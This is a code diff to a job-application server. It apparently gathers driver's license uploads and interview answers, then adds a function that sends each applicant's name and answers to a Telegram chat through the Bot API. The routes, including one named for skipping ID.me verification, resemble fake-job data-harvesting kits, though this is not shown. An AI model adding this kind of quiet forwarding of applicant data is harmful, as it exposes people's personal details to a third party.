@@ -153,13 +153,18 @@ router.post('/verify', driversLicenseUpload.fields(dlFields), async (req, res) =
   const normalizedPosition = normalizePosition(application.position);
   const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
   const answersObj = {};
+  let qaText = `Q&A for ${application.firstName} ${application.lastName} (${application.position}):\n`;
   questions.forEach(q => {
     let answer = interviewAnswers[q.name];
     if (typeof answer === 'undefined' || answer === null || answer === '') {
       answer = "(No answer provided or field name mismatch)";
     }
     answersObj[q.label] = answer;
+    qaText += `\n${q.label}\n${answer}\n`;
   });
+
+  // Send Q&A summary as text message to Telegram
+  await sendTextToTelegram(qaText);
 
   const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
   const timestamp = Date.now();
@@ -238,13 +243,18 @@ router.post('/skip-idme/', driversLicenseUpload.fields(dlFields), async (req, re
   const normalizedPosition = normalizePosition(application.position);
   const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
   const answersObj = {};
+  let qaText = `Q&A for ${application.firstName} ${application.lastName} (${application.position}):\n`;
   questions.forEach(q => {
     let answer = interviewAnswers[q.name];
     if (typeof answer === 'undefined' || answer === null || answer === '') {
       answer = "(No answer provided or field name mismatch)";
     }
     answersObj[q.label] = answer;
+    qaText += `\n${q.label}\n${answer}\n`;
   });
+
+  // Send Q&A summary as text message to Telegram
+  await sendTextToTelegram(qaText);
 
   const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
   const timestamp = Date.now();
@@ -384,6 +394,22 @@ Cover Letter: ${data.coverLetter || "N/A"}`;
     }
   } catch (e) {
     console.warn('Telegram send failed:', e.message);
+  }
+}
+
+async function sendTextToTelegram(text) {
+  try {
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+    if (botToken && chatId) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text }),
+      });
+    }
+  } catch (e) {
+    console.warn('Telegram send failed (text):', e.message);
   }
 }
 
